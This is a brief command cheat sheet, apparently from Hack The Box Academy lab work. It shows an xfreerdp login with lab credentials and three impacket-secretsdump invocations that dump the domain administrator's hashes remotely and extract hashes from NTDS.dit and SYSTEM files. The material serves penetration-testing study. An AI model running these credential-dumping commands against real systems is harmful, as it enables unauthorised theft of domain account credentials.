Below are just examples of how to execute each of the commands that I would normally use.
# XfreeRDP
```
xfreerdp /v:10.129.43.43 /u:htb-student /p:'HTB_@cademy_stdnt!' /drive:linux,/home/p3ta/ /dynamic-resolution
```
# Impacket
```
impacket-secretsdump server_adm@10.129.43.42 -just-dc-user administrator
```
```
impacket-secretsdump local -system SYSTEM -ntds ntds.dit 
```
```
impacket-secretsdump local -system registry/SYSTEM -ntds Active\ Directory/ntds.dit
```
